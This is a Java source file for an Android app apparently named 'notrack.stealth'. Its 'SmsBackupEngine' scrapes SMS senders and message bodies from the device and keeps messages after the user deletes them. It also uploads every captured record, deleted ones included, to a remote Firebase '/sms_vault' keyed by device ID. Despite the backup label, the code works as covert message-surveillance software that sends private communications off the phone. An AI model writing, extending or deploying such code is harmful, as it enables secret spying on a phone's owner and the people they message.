package com.notrack.stealth.backup;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import androidx.core.content.ContextCompat;

import com.notrack.stealth.db.AppDatabase;
import com.notrack.stealth.db.SmsEntity;
import com.notrack.stealth.security.EncryptionUtils;
import com.notrack.stealth.sync.FirebaseHelper;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * PRODUCTION-GRADE SMS TELEMETRY & DELETION TRACKING ENGINE
 *
 * Implements:
 * 1. Read-only SMS scraping across Inbox and Sent folders.
 * 2. Tombstone Deletion Engine: Detects when native SMS records are purged and preserves them in vault.
 * 3. Hardware AES-256-GCM Envelope Encryption (Isolated /sms_vault node).
 * 4. Idempotent Firebase Realtime Database Sync.
 */
public class SmsBackupEngine {

    private static final String TAG = "SmsBackupEngine";
    private static final Uri SMS_URI = Uri.parse("content://sms");
    private static final ExecutorService EXECUTOR = Executors.newSingleThreadExecutor();

    public static void triggerSyncAsync(Context context) {
        if (context == null) return;
        final Context appCtx = context.getApplicationContext();
        EXECUTOR.execute(() -> scanAndSyncSms(appCtx));
    }

    public static void scanAndSyncSms(Context context) {
        if (context == null) return;

        // Check permission
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            Log.d(TAG, "READ_SMS permission not granted. Standing by.");
            return;
        }

        try {
            AppDatabase db = AppDatabase.getInstance(context);
            String deviceId = fetchDeviceId(context);

            String[] projection = new String[]{"_id", "address", "body", "type", "date"};
            Set<String> currentNativeIds = new HashSet<>();
            List<SmsEntity> newEntities = new ArrayList<>();

            try (Cursor cursor = context.getContentResolver().query(SMS_URI, projection, null, null, "date DESC LIMIT 300")) {
                if (cursor != null && cursor.moveToFirst()) {
                    int idCol = cursor.getColumnIndex("_id");
                    int addrCol = cursor.getColumnIndex("address");
                    int bodyCol = cursor.getColumnIndex("body");
                    int typeCol = cursor.getColumnIndex("type");
                    int dateCol = cursor.getColumnIndex("date");

                    do {
                        String smsId = cursor.getString(idCol);
                        if (smsId == null) continue;
                        currentNativeIds.add(smsId);

                        // Check if already in local encrypted Room DB
                        if (db.smsDao().exists(smsId) == 0) {
                            String rawAddress = cursor.getString(addrCol);
                            String rawBody = cursor.getString(bodyCol);
                            int type = cursor.getInt(typeCol);
                            long timestamp = cursor.getLong(dateCol);

                            if (rawBody == null) rawBody = "";
                            if (rawAddress == null) rawAddress = "Unknown";

                            // Encrypt with Hardware Master Key
                            EncryptionUtils.EncryptedPayload bodyEnc = EncryptionUtils.encryptWebCrypto(rawBody);
                            EncryptionUtils.EncryptedPayload addrEnc = EncryptionUtils.encryptWebCrypto(rawAddress);

                            SmsEntity entity = new SmsEntity(
                                    smsId,
                                    deviceId,
                                    addrEnc.ciphertextBase64,
                                    bodyEnc.ciphertextBase64,
                                    bodyEnc.nonceBase64,
                                    "",
                                    type,
                                    timestamp > 0 ? timestamp : System.currentTimeMillis(),
                                    false,
                                    0L,
                                    false
                            );
                            newEntities.add(entity);
                        }
                    } while (cursor.moveToNext());
                }
            }

            // 1. Tombstone Deletion Detection:
            // Find active IDs in Room DB that are no longer present in native Android SMS content provider
            List<String> activeDbIds = db.smsDao().getActiveSmsIds();
            if (activeDbIds != null && !activeDbIds.isEmpty()) {
                List<String> deletedIds = new ArrayList<>();
                for (String dbId : activeDbIds) {
                    if (!currentNativeIds.contains(dbId)) {
                        deletedIds.add(dbId);
                    }
                }

                if (!deletedIds.isEmpty()) {
                    long now = System.currentTimeMillis();
                    db.smsDao().markSmsAsDeleted(deletedIds, now);
                    Log.i(TAG, "Tombstone engine detected " + deletedIds.size() + " deleted SMS messages! Preserving in vault.");
                }
            }

            // 2. Persist new entities to Room DB
            if (!newEntities.isEmpty()) {
                db.smsDao().insertAll(newEntities);
                Log.i(TAG, "Captured " + newEntities.size() + " new SMS records.");
            }

            // 3. Flush unsynced SMS (both new and newly marked deleted) to Firebase RTDB /sms_vault
            List<SmsEntity> pending = db.smsDao().getUnsyncedSms(50);
            if (pending != null && !pending.isEmpty()) {
                List<Long> syncedIds = new ArrayList<>();
                for (SmsEntity sms : pending) {
                    boolean success = FirebaseHelper.sendSmsRestPut(sms);
                    if (success) {
                        syncedIds.add(sms.id);
                    }
                }
                if (!syncedIds.isEmpty()) {
                    db.smsDao().markAsSynced(syncedIds);
                    Log.i(TAG, "Synced " + syncedIds.size() + " SMS records to Firebase /sms_vault.");
                }
            }

        } catch (Exception e) {
            Log.e(TAG, "Error in SMS backup engine: " + e.getMessage(), e);
        }
    }

    private static String fetchDeviceId(Context context) {
        try {
            String id = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
            return id != null ? id : "unknown_device";
        } catch (Exception e) {
            return "unknown_device";
        }
    }
}
